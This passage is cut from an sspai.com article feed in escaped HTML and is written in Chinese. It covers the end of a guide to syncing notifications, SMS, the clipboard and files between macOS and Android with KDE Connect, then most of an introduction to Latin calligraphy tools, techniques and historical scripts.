src=\"https://cdn.sspai.com/editor/u_/c506k2db34tdhopdm540.jpeg\"></figure><p>最终的呈现效果就是：在手机端被勾选允许同步的 App 的通知才会出现在 macOS 的通知中心里。例如笔者我经常使用的用药提醒应用 Medisafe，他的通知就会根据设定好的时间在我的 macOS 桌面弹出，并且我还可以直接对通知进行操作，是选择「延迟」「跳过」还是「服用」。</p>\n<h3>短信息管理</h3>\n<p>KDE Connect 的短信息同步和接发其实分为两个部分，一个是在桌面端接收到通知，一个是在桌面端发短信，相比其他类似的服务要显得繁琐一些。</p>\n<p>首先我们需要能够在桌面接收到短信通知，这里 KDE Connect 需要在「通知同步」中勾选上你的短信 App（比如 Pixel 就是消息 App），这时候来短信之后会通过通知的形式推送到你的 macOS 桌面，需要说明的是 KDE Connect 并不支持短信息在通知中快捷回复，只能进行「已读」操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k2lb34tdhopdm54g.png\"></figure><p> </p>\n<p>那么怎么在桌面端回或者发短信呢？这里 KDE Connect 中有个单独的功能项目，在 macOS 端，名字就叫「SMS」，而在 Android 端我们需要在「插件设置」中打开「发送短消息」，在 Android 端还可以进一步设置，比如是否群发彩信、是否将长文本以彩信的形式发送，以及是否转换为彩信。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k2tb34tdhj3i1ckg.jpeg\"></figure><p>设置完成之后，我们就可以在桌面端发送短信了，在菜单栏找到 KDE Connect，然后点击图标后在弹出的下拉菜单中找到你链接的 Android 设备并选择「SMS Messages」等待短信功能同步完成。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k35b34tdhtodss80.jpeg\"></figure><p>在这个独立的短信功能页面中，你可以看到最近收到的所有短信，并直接进行回复，当然也可以在顶部的 Filter 中输入号码来新建短信并发送，虽说这个短信功能管理器的 UI 看上去相当「寒碜」，但也确实实现了在桌面端发送短消息的功能。</p>\n<h3>「基本可用」的剪贴板同步</h3>\n<p>桌面端和手机端之间的协同自然离不开另一个核心功能需求：两个端之间的剪贴板同步。相比 Join 在端之间的「无感同步」，KDE Conncet 的剪贴板同步可能没那么顺滑——有一个端的同步需要「手动发送」一下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k3db34tdhj3i1cl0.jpeg\"></figure><p>我们还是在 macOS 端的插件列表中勾选上「Clipboard」，之后我们回到 Android 端，在「插件设置」中开启「剪切板同步」，如果这时候提示需要系统相关权限，予以通过即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k3lb34tdhtodss8g.png\"></figure><p> </p>\n<p>下面我们来测试一下这个功能，首先我们选择将 macOS 上剪切板中的文本同步到 Android 上，在 macOS 上选中一段文本然后复制，再回到 Android 上随便打开一个 App 上的文本编辑框，如果你恰好使用的是 Gboard，那么在剪切板预览中应该就可以看到刚才我们在 macOS 上复制的文本了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k3tb34tdhopdm550.png\"></figure><p>但将 Android 上同步剪切板到 macOS 上就没那么「无感」了，这里的同步操作更像是将剪切板「发送到」macOS 上——在 Android 上选中并复制某段文本，然后在系统的通知栏中找到 KDE Connect 的固定通知，这里会有两个快捷操作：「发送剪贴板」和「发送文件」，这里我们直接点击「发送剪贴板」，再回到 macOS 上找到一个文本框「粘贴」，可以看到 Android 的剪贴板也「同步」到 macOS 上了。</p>\n<h3>类似「隔空投送」的文件互传</h3>\n<p>另一个跨端协同上经常使用的功能就是端与端之间的文件互传，由于 KDE Connect 本身主要是基于局域网进行数据传输的，因此在文件互传上无需通过互联网，自然速度和效率上要高出不少。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k45b34tdhtodss90.png\"></figure><p>同样我需要首先在 macOS 端中找到插件「Share and receive」并勾选激活，同时还可以对文件保存的设置就行调整。回到 Android 端则需要打开「插件设置 - 发送和接受」，和 macOS 端一样我们同样可以设定文件接受保存的本地目录，并可以开启接收通知。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k4db34tdhn8pbmgg.png\"></figure><p>接下来我们测试下文件传输，首先是 macOS 端，我们在菜单栏找到 KDE Connect 图标，点击选择连接的 Android 设备并找到「Send a file / URL」功能项。在弹出的窗口中选择 send File 并定位选择到本地目录的一个文件，点击 OK 传输文件，这时 Android 应该就会弹出通知，打开此前设定的接受文件夹，文件已经传输过来了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c506k4lb34tdhj3i1clg.png\"></figure><p>同理我们也可以将 Android 手机中的文件传输到 macOS 上，在 Android 通知栏中找到 KDE Connect 并选择快捷操作「发送文件」，定位到 Android 目录下并选择想要发送的文件，等待完成上传后 macOS 对应的接收文件夹就可以看到发送的文件了，因为在局域网内传输，速度还是相当有保证的，唯一缺点可能就是一次只能传输一个文件且无法传输文件夹。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c506k4tb34tdhn8pbmh0.png\"></figure><h3>那些更为高阶的小功能</h3>\n<p>除了上述介绍的功能之外，KDE Connect 还提供了相当多的实用小功能，比如说你可以在 macOS 显示当前连接的 Android 的电量以及网络情况，让 Android 来电时在 macOS 上弹出通知（但不能在 macOS 上接听）；或者是让 macOS 控制 Android 设备的音量、启动相机、操控键鼠、发送命令，甚至将 macOS 的系统通知同步到 Android 手机上。总之你都可以根据自己的需求开启相对应的插件，实现更为紧密的跨设备协作。</p>\n<h2>总结</h2>\n<p>总的来说，虽然这原本是一款为 Linux 桌面和 Android 手机协同而开发的工具，但却意外的成为我在 macOS 上和 Android 协同的免费解决方案。当然单就功能而言，虽然 UI 上颇为简陋，但却很好实现我想要的基础功能，甚至在某些功能上做得不比某些付费服务要差。</p>\n<p>当然作为一款依旧还在完善的开源服务，KDE Connect 的缺点同样非常明显：完全依赖局域网环境、文件传输仅支持单个文件、不支持桌面通话等等。当然如果你对 Android 和 macOS 的协同没有太高的要求，那么 KDE Connect 就已经足矣；如果你对服务稳定性有较高的要求，那么商业付费的服务或许才是你的首选。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68779"},{"title":"莫谓字母无机巧，铁画银钩见锋芒：西文书法（Calligraphy）初探","date":"2021-09-26 08:00:00","description":"\n<h2>Calligraphy 是什么？</h2>\n<p>Calligraphy，一种或许可以大概理解为「西文书法」的艺术。但是，有经验的学习者一般会避免「书法」这个词，因为 calligraphy 和我们所熟知的汉字书法实在有太大的区别。把「书法」这个名字强加于它，会导致大量的误会和刻板印象。</p>\n<p>本文主要介绍拉丁字母的 calligraphy。一般来说，这主要指的是，出于审美的目的，用特定的工具来书写拉丁字母。字母间距、词间距、行间距等也都是 calligraphy 需要考虑的问题。有时，calligraphy 还包括在纸上制作精美的花纹和复杂的图案，甚至包括版面设计，但本文的介绍将着重于字母的书写。</p>\n<p>事实上，我们平时所说的中文书法完全可以称作 calligraphy。但是，对于一个母语使用拉丁字母的人来说，一个人的书写是否好看，很少与其个人修养联系在一起，更不会有「字如其人」这样常常导致偏见发生的观点。所谓「书法家」，一开始只是抄写员而已。</p>\n<p>比起中国书法，calligraphy 的复杂程度也许要低得多。书写者在很大程度上都在追求和范本的完全一致，而这份范本的书写者也总是在追求自己作品中的每一个字母都完全一致。如果大家看到你的作品就觉得「这难道不是印刷品吗」，那你就成功了。calligrapher 所追求的「印刷美」也就决定，只要愿意，就算永远不考虑任何创新，你也可以成为一个大师。</p>\n<h2>从工具入手认识 Calligraphy</h2>\n<p>一幅 calligraphy 作品最容易让从未接触过的人产生的问题是：这些笔画中优美的粗细过渡是如何实现的？可能会有读者认为，这些粗笔画是先描边，再涂色而产生的。但事实上，书写的工具在很大程度上决定了诸多 calligraphy 字体的字形，而这些字形如今已经深深地刻在了我们的脑海中。换句话说，正是因为我们能够一笔写出来，它们才会是这个形状。</p>\n<p>绝大多数传统的 calligraphy 字体都需要特殊的工具来书写。这些工具，根据笔尖的形状大致可以分为两类：</p>\n<ol>\n<li>平头笔尖：简称<strong>平尖</strong>，即笔尖触纸部位的形状是一条线，横向较宽，纵向则越细越好。</li>\n<li>点状笔尖：简称<strong>点尖</strong>，即笔尖触纸部位的形状是一个点，这个点越小越好。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/24/0501ee83d4aebb1efd56e5fe07fdfa39.jpeg\"><figcaption>平尖（左）和点尖（右），图源：paperinkarts.com</figcaption></figure><p>需要特别解释的是「<strong>越细越好</strong>」和「<strong>越小越好</strong>」。一般来说，之所以使用特殊工具来书写，是为了让笔画有粗细的对比度：厚重的笔画足够饱满，轻盈的笔画足够纤细。</p>\n<p>想要改变平尖笔画的宽度，大体来说有这几种情况：</p>\n<p><strong>改变运笔方向</strong>：比如，采用正常的握笔方式时，书写大写字母 A，左侧会比右侧细，如下图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jb4tb34takvpmlvt0.jpeg\"><figcaption>大写字母 A</figcaption></figure><p><strong>转笔</strong>：在不改变运笔方向时可以通过运笔的同时转笔来改变笔画宽度，如下图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jb5tb34taj5bdoc90.jpeg\"><figcaption>转笔</figcaption></figure><p><strong>改变触纸力度</strong>：如果使用带有弹性的笔尖（通常为蘸水笔尖），也可以通过向笔尖施加压力来让笔画变宽，但这种方法不常用。如下图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jb6lb34taj5bdoc9g.jpeg\"><figcaption>向平尖施加压力</figcaption></figure><p>对于点尖来说，唯一改变笔画宽度的方法是向笔尖施加压力：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jb7lb34taja4roedg.jpeg\"><figcaption>向点尖施加压力</figcaption></figure><p>笔画的粗细和组合排布方式共同决定了字形。</p>\n<h3>平尖笔及其技术</h3>\n<p>平尖笔是最常见，也是历史最悠久的 calligraphy 书写工具。有很多字体的形状都与平尖笔在纸上的表现方式密不可分，而这些字体的形状又成为了如今电脑字库的基础。</p>\n<p>这一节会介绍一些用平尖笔书写的技术，尤其是一些常见的笔画形状如何实现。很多印刷字体都是基于 calligraphy 字体，因此，读完这一节之后你或许会对「这个字体为什么长这样」有一些新的认识。</p>\n<p>相较于点尖来说，平尖笔的普及所需要的历史和物质因素要少得多。事实上，点尖几乎只包括现代的钢制笔尖，但任何形状合适，又能有效集成供墨系统的薄片状物体都可以当平尖笔使用（比如墙刷漆的扁刷子）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jb85b34taj5bdoca0.jpeg\"><figcaption>图源：https://www.amazon.com/Pro-Grade-Professional-Painting-Commercial-Paintbrush/dp/B07JHQ4L4F</figcaption></figure><p>事实上，直到今天还有一些爱好者会推崇芦苇杆削成的平尖笔。这可能是出于笔尖的韧性或者弹性考虑，当然也有可能是为了尽可能复刻古代的工具，从而实现古本（facsimile）中的书写效果。</p>\n<p>如今，最常被用来练习平尖 calligraphy 的是以下三种具有钢制笔尖的工具：</p>\n<ul>\n<li>著名的百乐平行笔 Pilot Parallel Pen，</li>\n<li>平尖钢笔，</li>\n<li>蘸水平尖笔。</li>\n</ul>\n<p>除此之外，平头笔刷、刻刀、削平的可吸水草秆等工具也常被用来书写平尖 calligraphy，但它们没有前三种那么常用并容易入门。</p>\n<p>我们来分别简单介绍一下这三种工具的供墨系统。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jb8db34tajfh55ueg.jpeg\"><figcaption>百乐平行笔，图源：百乐官方</figcaption></figure><p>百乐平行笔的笔尖是两片叠放的金属薄片，中间有极小的缝隙，墨水将扩散填满整个缝隙，从而使书写者能够用缝隙暴露的任何部位书写。比如，把笔尖立起来，让笔尖的顶点触纸，就可以书写细的笔画。百乐平行笔一共有六种尺寸，目前国内容易买到的是 1.5、 2.4、3.8、6.0 毫米的版本。如果用笔尖顶点书写，笔迹在 0.7 毫米左右。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jb8lb34tajfh55uf0.jpeg\"><figcaption>平尖钢笔，图源：Manuscript 钢笔官方</figcaption></figure><p>平尖钢笔和钢笔类似，只有笔尖不同——其尖端的宽度一般在 0.9 毫米以上。墨水只能从笔尖的中缝流出，从而限制了平尖钢笔的宽度。平尖钢笔的一大优势是书写时的顺滑感。如果笔尖够薄，笔画的锋利度（下文会提到）也会有一定的保证。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jb8tb34taja4roee0.jpeg\"><figcaption>蘸水平尖，图源：Speedball 笔尖厂商官方</figcaption></figure><p>蘸水笔是可拆卸的笔尖和笔杆的组合。在表现力方面，蘸水笔具有钢笔和百乐平行笔无法媲美的优势。由于不需要复杂的供墨系统，它的触纸部位可以做得非常薄，从而允许书写者书写出非常锋利的笔画，也具有一定的弹性。</p>\n<h4>笔尖的角度</h4>\n<p>首先我们来认识一下决定用平尖笔书写时决定笔画宽度的主要因素：笔尖的角度。前面已经提到，平尖笔的笔尖可以看作是一个矩形薄片状的物体，我们用它的一条边来书写。这条棱的俯视图是一条短线，我们把这条短线和书写网格的<strong>基线</strong><sup class=\"ss-footnote\" href=\"\" title=\"基线：所谓基线，是指除了 J 以外所有大写字母最下方的点坐落的直线。\" footnote-id=\"1\">1</sup>之间的夹角称为<strong>笔尖的角度</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jb9db34taj5bdocag.jpeg\"><figcaption>不同角度下竖笔的形状</figcaption></figure><p>当笔尖的角度固定不变时，不同的运笔方向会对应笔画的宽度：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jb9tb34tajfh55ufg.jpeg\"><figcaption>固定笔尖角度下运笔方向对笔画宽度的影响，使用 iPad app Tayasui Calligraphic 演示</figcaption></figure><p>所以，<strong>笔尖的角度越小，竖的笔画就越宽，横的笔画就越窄。</strong></p>\n<p>一些简单的计算可以帮你更清楚地理解这个问题。设笔尖的宽度为 𝑑，笔尖的角度为 𝛼，运笔方向与基线右侧的夹角为 𝛽。其中，一般对于右手书写者来说，0° ⩽ 𝛼 ⩽ 90°。为了避免逆向运笔导致的出墨不畅，通常也会要求 𝛽 ⩽ 𝛼。</p>\n<p>那么此时，笔画的宽度为 𝑤 = 𝑑⋅sin (𝛽 - 𝛼)。</p>\n<p>在此意义下，当笔尖的宽度 𝑑 固定时，运笔方向与笔尖角度之差为 90° 直角时，笔画最宽（等于笔尖的宽度）；运笔方向与笔尖角度之差为 0° 时，笔画最窄（等于笔尖的厚度）。</p>\n<p>这个现象可以解释很多印刷字体中「撇」比「捺」窄的原因，因为很多印刷字体，尤其是<strong>衬线</strong>字体都是基于书写设计。</p>\n<h4>衬线</h4>\n<p>仅次于主要的笔画，衬线也决定了很多字母在我们眼中的特征。所谓衬线，是指附加于一些笔画末端，并常与主笔画垂直，象征主笔画结束的小笔画，如下图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbalb34taj5bdocb0.jpeg\"><figcaption>衬线，图源：Wikipedia</figcaption></figure><p>除了装饰作用以外，衬线可以用来修整笔画不平整的末端，比如下面的小写字母 i：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbatb34takvpmlvu0.jpeg\"><figcaption>没有衬线的 i 和加上衬线的 i</figcaption></figure><p>由于在书写衬线时的运笔方向一般都与笔尖角度平行（即上面所说的 β - α = 0°），所以衬线的宽度是极小化的，最大限度地避免了不平整的笔画末端。在这种意义下，可以将书写中的衬线理解为一种有固定样式的补笔。</p>\n<h4>转笔</h4>\n<p>转笔是一项相当重要的书写技能。恰当的转笔能够让笔画的粗细变化更加灵活丰富，从而极大地增强一支平尖笔的表现力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbb5b34taja4roeeg.jpeg\"><figcaption>使用了转笔技术和不使用转笔技术的字母对比</figcaption></figure><p>转笔的操作可以不同的笔画之间或者书写同一个笔画的过程中完成，其中后者需要书写者对笔尖相当精准的控制能力，因为在一般情况下，运笔和转笔是同时发生的。</p>\n<h4>游丝和笔画的锋利程度</h4>\n<p>除了宽厚的粗笔画外，我们也需要一些细的笔画来更好地连接主笔画，并让字形更具美感，这就是游丝。</p>\n<p>游丝是指那些在书写时「越细越好」的笔画。虽然我们并不希望这些笔画「细到看不见」，但是我们有时会尝试实现一个工具所能书写出的最细笔画。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbbdb34tajfh55ug0.jpeg\"><figcaption>拖动残墨</figcaption></figure><p>你可能已经想到了，我们一般用笔尖的顶点来拖动没有干透的墨水来书写游丝。对于一些特殊的供墨系统，比如百乐平行笔的供墨系统来说，最细的笔画是可以无限书写的，它不依赖于没有干透的残墨；但是，对于蘸水笔来说，如果残墨已经干透，那么用笔尖的顶点是写不出任何东西的。</p>\n<p>另一方面，百乐平行笔侧锋在书写游丝时无限的供墨，是以牺牲笔画的锋利度为代价的。所谓笔画的锋利度，一般来说可以用一个笔尖所能书写最宽的笔画与最细的笔画之间的对比度来衡量。当这个对比度足够高时，笔尖能书写出有棱有角的四边形笔画；反之，则只能书写出圆角的笔画。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbbtb34takvpmlvug.jpeg\"><figcaption>不锋利的笔画（左）和锋利的笔画（右）</figcaption></figure><p>在常见的书写工具中，蘸水平尖笔的笔尖最薄，也最容易书写出锋利的笔画。</p>\n<h4>补笔</h4>\n<p>补笔（retouch）是一项听起来有些不太体面，但完全可行，也非常有用的技术。在书写时，我们很难确保每一次运笔的结果都非常完美，这时就需要再对笔画进行小的修补。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbcdb34taja4roef0.jpeg\"><figcaption>小写字母 c 的上方衬线一笔完成，使用 iPad app Tayasui Calligraphic 演示</figcaption></figure><p>在上面这种很常见的情况中，如果使用的笔尖和纸都毫无弹性，那么最后一笔将无法实现。这时，就可以利用补笔来解决这一点：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbclb34tajfh55ugg.jpeg\"><figcaption>最后一笔是补笔</figcaption></figure><p>当然，calligrapher 们会尽可能不把可以一笔完成的任务毁到必须要补笔的程度。</p>\n<h3>点尖笔及其技术</h3>\n<p>虽然诸多点尖 <strong>penmanship</strong><sup class=\"ss-footnote\" href=\"\" title=\"对于点尖书法，人们更常用 penmanship 来指代，而不是 calligraphy。\" footnote-id=\"2\">2</sup> 的成熟距今只有两三个世纪，但弹性点尖强大的表现力还是将大量的 calligraphy 爱好者拉入了这个既飘逸流畅，又困难重重的大坑。</p>\n<p>我们这里所说的点尖笔特指的是蘸水点尖笔。蘸水笔的好处是，由于不需要额外的供墨系统，笔尖可以做得相当薄，从而具有一定的弹性——当施加压力时，笔尖的中缝会随之张开，笔画也就跟着变粗：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbdlb34tajfh55uh0.jpeg\"><figcaption>笔尖张开</figcaption></figure><p>不难想到，利用这种方式让笔画加粗的代价是，运笔方向十分有限。理论上讲，当笔尖张开时，你只能沿着笔尖中缝的方向运笔，否则，笔尖会卡进纸张甚至崩坏。</p>\n<p>另一方面，如果你有印象，绝大多数具有斜度的 calligraphy 字体都是向右倾斜，这与惯用右手者习惯的运笔方式完全相悖。</p>\n<p>为了解决这种矛盾，市面上大多数的点尖蘸水笔杆都是所谓的<strong>斜杆</strong>（oblique penholder），如下图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbedb34tajfh55uhg.jpeg\"><figcaption>斜杆蘸水笔，图源：paperinkarts.com</figcaption></figure><p>这个笔杆能部分地手臂的运动方向矫正到笔画的方向。剩下的一部分则通过转纸实现：在书写时，书写者应使纸张的斜度线与自己垂直，从而顺利地写出粗笔画。</p>\n<p>由于粗笔画本身的形状也很重要，我们经常需要保持笔尖中缝一侧的一叶不动，而让另一叶书写出弧度。这种对于笔尖两叶分别的控制能力，也就成了点尖书写最重要的基本功之一。</p>\n<h4>Shading</h4>\n<p>「淡入淡出」的优美粗笔画是很多点尖字体的魅力所在。我们用「<strong>shade</strong>」一词来指代点尖书写时用力产生的粗笔画。当它用作动词时，则指的是「为…加粗」。</p>\n<p>在一篇作品中，我们一般会希望所有的主笔画（stem）有相同的斜度，尤其是 shade。与此同时，在书写 shade 时笔尖处于张开状态，此时笔尖触纸部位的阻力极大，所以不宜改变运笔方向，否则笔尖会很容易损坏。想要让 shade 具有弧度，我们能做的一般来说是固定笔尖张开后的其中一侧，同时改变施加的压力，让另一侧远离或靠拢，从而得到具有弧度的 shade。这也就是说，我们的 shade 总有一侧几乎是直的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbelb34tajfh55ui0.jpeg\"><figcaption>Ornamental Penmanship，注意所有的 shade 几乎都具有相同的斜度甚至形状</figcaption></figure><h4>写出平整的顶端</h4>\n<p>为了体现近乎偏执的「印刷美」，在很多情况下，我们需要隐藏日常手写的随意性，而使得一个竖直的 shade 具有平整的顶端和底端。这一操作需要之前提到的那样对笔尖精确的操控：在起笔时让笔尖匀速张开从而写出一个三角，当笔尖左叶张开到一定程度（即横向宽度达到想要的粗度）时，改变运笔方向，向主笔画的方向运笔：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbf5b34taj5bdocbg.jpeg\"><figcaption>书写平整的顶端</figcaption></figure><h4>断笔</h4>\n<p>断笔同样是一项很不「手写」的技术。如同你在前几张动图中常常看到的那样，我们经常在需要转弯的地方提笔，再落笔写出衔接的游丝。对于初学者来说，这一操作能够使其快速上手，成功地控制笔尖两页的走向从而书写出一个转角。</p>\n<h4>Muscular Movement</h4>\n<p>直到这里，你看到的字体几乎都是基于十分缓慢的运笔的，虽然它们看起来可能又倾斜，又连笔。</p>\n<p>真正可以实现快速书写的字体非常少，而且就算真的连笔，它的书写速度也很难赶得上普通人日常书写的字体。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbflb34takvpmlvv0.jpeg\"><figcaption>muscular movement 的书写速度</figcaption></figure><p>在最后的这个例子中我们看到的是 spencerian 家族字体需要的运笔方式——<strong>muscular movement</strong>。具体来说，它指的是利用手臂和肌肉记忆，快速（而几乎不经思考）的运笔方式。这样的运笔方式能够极大地减少运笔时的抖动，从而帮助我们获得光滑平顺的笔画。当然，只有大量的练习才能让我们在保证字形精准的同时提升运笔速度。</p>\n<h2>Calligraphy 字体</h2>\n<p>本节中我们将见到一些常见的 calligraphy 字体。因为字体之间的分界线或许并没有那么明显，我在这里只挑选最具个性的范本展示出来。</p>\n<h3>Roman Square Capitals</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbg5b34tajfh55uig.jpeg\"><figcaption>Trajan 石碑</figcaption></figure><p>这个字体常见的另一个名字是 Imperial Capitals，因为它诞生于昔日的罗马帝国时代。上面的这块石碑用于纪念彼时的统治者 Trajan。</p>\n<p>你可能很难想到，在本文将要介绍的字体中，Roman Square Capitals 是最为古老的一个。这个石碑上字体看起来已经如此的成熟，它几乎完全定义了我们现在仍在使用的大写字母的形状。一般认为 Trajan 石碑完成于公元 113 年，而其上的雕刻也象征着拉丁字母的形状已经基本固定下来。</p>\n<p>一个更适合在纸上书写——更快速、更节省空间的变体如下。它保留了石碑上字体的整体框架，同时，粗细笔画的对比度大幅提高。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbglb34taja4roefg.jpeg\"><figcaption>馆藏于瑞士 Abbey Library 的羊皮纸片段，大致书写于公元 4 或 5 世纪</figcaption></figure><h3>Uncial</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbgtb34taja4roeg0.jpeg\"><figcaption>馆藏于英国 Dean and Chapter Library 的片段，大致书写于公元 6 世纪</figcaption></figure><p>Uncial 的最大特点是它相比于之前字体较大的横竖比例，以及大量的圆形曲线。上图中展示的是 Uncial 发展后期更为精致的变体 Artificial Uncial。</p>\n<p>虽然 Uncial 看起来很「圆」，并已经初步具有了现代印刷体 a 的字形（现在你知道小写 a 是如何开始具有如今的双层结构），但它仍被归为一个「大写体」，因为它基本不具有小写字母特有的升部和降部（比如小写字母 h 和 k 具有升部，g 和 y 则具有降部）。另外，字母 E 的右侧虽然还是有两个开口，但「变圆」的它已经非常类似如今的小写 e。</p>\n<h3>Insular Majuscule</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbh5b34takvpmlvvg.jpeg\"><figcaption>著名的 Book of Kells 片段，书写于公元 8 或 9 世纪</figcaption></figure><p>Insular Majuscule 得名于它在爱尔兰的繁荣。上图中的例子常被认为是 calligraphy 古本最精致的代表之一。这个字体最明显的特征是它楔状的衬线。关于这样的衬线如何演变而来，至今我们仍然没有定论。</p>\n<p>在这个突然的转变中，进一步「变圆」的字母也进一步演化为了如今的小写字母，比如单层的 𝑎，q 这样明显和 Roman Square 不同的字母，还有 m，n 这样框架不变，但更适合一笔书写的字母<sup class=\"ss-footnote\" href=\"\" title=\"按如今日常手写体的运笔方式，Insular Majuscule 中形状的 m 的确可以一笔完成，但如果你想用平尖笔书写 Insular Majuscule，用一笔完成是几乎不可能的.\" footnote-id=\"3\">3</sup>。</p>\n<p>另一个值得注意的字形是字母 G。在 Insular Majuscule 中，G 已经初步具有了如今小写双层 g 的形状，这一演变轨迹大致如下：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbhdb34taj5bdocc0.jpeg\"><figcaption>字母 G 的演变</figcaption></figure><p>下方的笔画逐渐延长，形成了如今印刷体 g 下方的环形结构。</p>\n<h3>Textura Quardrata / Textura Prescisus（TQ 和 TP）</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbhlb34tajfh55uj0.jpeg\"><figcaption>上图：Textura Quardrata，来自一份圣经古本，书写于约公元 1400 年；下图：Textura Prescisus，来自古本 The Luttrell Psalter，书写于约公元 1300 年</figcaption></figure><p>这两个字体是中世纪哥特字体的代表。由于采用了几乎完全竖直的笔画和极少的细笔画，整篇的 TQ 和 TP 看起来会有编织物一样严丝合缝的美感。</p>\n<p>TP 最明显的特征是它平整而与基线重合的足部。在 TQ 中，字母的基线处则经常使用菱形的装饰。</p>\n<p>这里我们仍然要关注一下小写 g。可以看到，下方环形结构的左半边已经十分的细，几乎已经成为开口，和如今手写的小写 g 更为相似。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbhtb34taja4roegg.jpeg\"><figcaption>TQ 中的小写字母 g</figcaption></figure><h3>Italic</h3>\n<p>作为一种更为实用，但仍具有相当美观性的字体，Italic 是当今最常见的 calligraphy 字体之一。举个例子，我们如今常用的小写字母 a 的写法就首先出现于 Italic 字体中：它的主要特点是，它只有一个环形结构（我们称为单层 a，下文中会有更详细的介绍），从而允许书写者在不提笔的前提下，一笔写完这个字母。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbi5b34takvpmm000.jpeg\"><figcaption>一张现代 Italic 的字母表。图源：https://quillskill.com/worksheets/italic-big.htm</figcaption></figure><p>或许是为了追求书写速度，Italic 的另一个特点是，统一而普遍存在的斜度。这个特点的影响力流传至今：我们现在仍然习惯于将一个印刷字体的斜体版本称为 Italic<sup class=\"ss-footnote\" href=\"\" title=\"Italic：一般来说，能够被称为 Italic 的斜体字库必须是经过特殊处理，从而更接近于传统的 Italic 手写体的。仅仅做倾斜处理的字体不能称为 Italic。\" footnote-id=\"4\">4</sup>。</p>\n<h3>Engraver’s Script</h3>\n<p>Engraver’s Script（以下简称为 ES）是一种需要采用弹性点尖书写的字体。它的另一个名字 Roundhand 则直译为「圆体」。在历经了各种不伦不类的演绎之后，这个字体至今都是各类误解的高发领域。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c56jbidb34takvpmm00g.jpeg\"><figcaption>书写者：W. A. Baird</figcaption></figure><p>从 Engraver（雕刻师）的字面意思可以看出，ES 最显著的特点是它在转角处锋利的收尾。事实上，还有一个叫做 English Roundhand（以下简称 ER）的字体，它和 ES 最大的区别就是转角处的处理：</p>\n<figure class=\"image ss-img-wrapper\"><img 